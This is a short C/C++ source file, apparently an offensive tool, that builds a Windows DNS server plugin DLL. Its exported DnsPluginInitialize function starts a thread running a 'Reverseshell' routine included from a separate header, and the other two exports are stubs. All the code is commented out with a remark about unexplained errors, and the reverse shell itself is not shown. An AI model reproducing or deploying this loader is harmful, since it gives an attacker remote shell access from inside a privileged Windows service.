#include "stdafx.h"
#include "reverseshell.h"

#define DNS_PLUGIN_API __declspec ( dllexport )

/* Make errors for unknown reason

#pragma comment(linker, "/EXPORT:DnsPluginInitialize=?DnsPluginInitialize@@YAHPEAX0@Z")

DNS_PLUGIN_API int DnsPluginInitialize(PVOID a1, PVOID a2) {
	HANDLE h;
	DWORD threadId;
	h = CreateThread(0, 0, Reverseshell, 0, 0, &threadId);

	return 0;
}


#pragma comment(linker, "/EXPORT:DnsPluginCleanup=?DnsPluginCleanup@@YAHXZ")
DNS_PLUGIN_API int DnsPluginCleanup() { return 0; }

#pragma comment(linker, "/EXPORT:DnsPluginQuery=?DnsPluginQuery@YAHPEAX000@Z")
DNS_PLUGIN_API int DnsPluginQuery(PVOID a1, PVOID a2, PVOID a3, PVOID a4) { return 0; }
*/